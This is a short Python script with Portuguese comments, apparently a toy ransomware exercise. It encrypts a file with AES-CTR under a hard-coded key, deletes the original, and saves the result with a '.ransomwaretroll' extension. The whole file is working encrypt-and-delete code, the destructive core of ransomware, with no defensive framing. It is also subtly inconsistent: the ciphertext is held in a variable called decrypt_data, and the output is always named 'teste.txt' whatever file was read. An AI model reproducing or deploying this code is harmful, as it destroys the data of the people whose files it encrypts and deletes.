###################################################################################
#  Autor: Lucas Henrique 
#  Data da ultima alteração: 21/12/2023
#  descricao: criptografia de arquivos
#  arquivo encrypt.py: crptografa um arquivo
#  arquivo descript.py: descriptografa um arquivo
###################################################################################

import os

import pyaes

# URI do arquivo a ser criptografado
file_name = 'teste.txt'

# Ler o conteúdo do arquivo
try:
  file = open(file_name, 'rb')
  file_data = file.read()
  file.close()    
except:
  file_name = input("Digite o nome do arquivo a ser criptografado: ")
  file = open(file_name, 'rb')
  file_data = file.read()
  file.close()

key = b'testkey123456789'

aes = pyaes.AESModeOfOperationCTR(key)

decrypt_data = aes.decrypt(file_data)

os.remove(file_name)
new_file = 'teste.txt' + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(decrypt_data)
new_file.close()
print("Arquivo criptografado com sucesso")